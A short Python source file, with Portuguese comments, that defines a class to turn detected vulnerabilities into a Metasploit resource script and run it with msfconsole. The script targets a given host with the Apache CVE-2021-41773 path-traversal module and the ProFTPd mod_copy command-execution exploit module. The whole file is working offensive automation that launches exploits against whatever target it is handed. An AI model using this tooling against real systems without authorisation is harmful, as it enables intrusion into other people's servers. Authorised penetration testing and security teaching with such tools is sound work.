#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import subprocess
import os

class MetasploitIntegration:
    def __init__(self, target):
        self.target = target

    def generate_metasploit_script(self, vulnerabilities):
        script_content = f"""# Metasploit Script Gerado Automaticamente
# Alvo: {self.target}

"""
        
        for vuln in vulnerabilities:
            if 'Apache 2.4.49' in vuln or 'CVE-2021-41773' in vuln:
                script_content += f"""
# Exploit Apache Path Traversal
use auxiliary/scanner/http/apache_normalize_path
set RHOSTS {self.target}
run
"""
            elif 'ProFTPd 1.3.5' in vuln:
                script_content += f"""
# Exploit ProFTPd
use exploit/unix/ftp/proftpd_modcopy_exec  
set RHOSTS {self.target}
run
"""
        
        script_path = f"metasploit_{self.target}.rc"
        with open(script_path, "w") as f:
            f.write(script_content)
        
        return script_path

    def run_metasploit(self, script_path):
        if os.path.exists("/usr/bin/msfconsole"):
            print("[*] Executando Metasploit...")
            subprocess.run(["msfconsole", "-r", script_path])
        else:
            print("[-] Metasploit não encontrado")
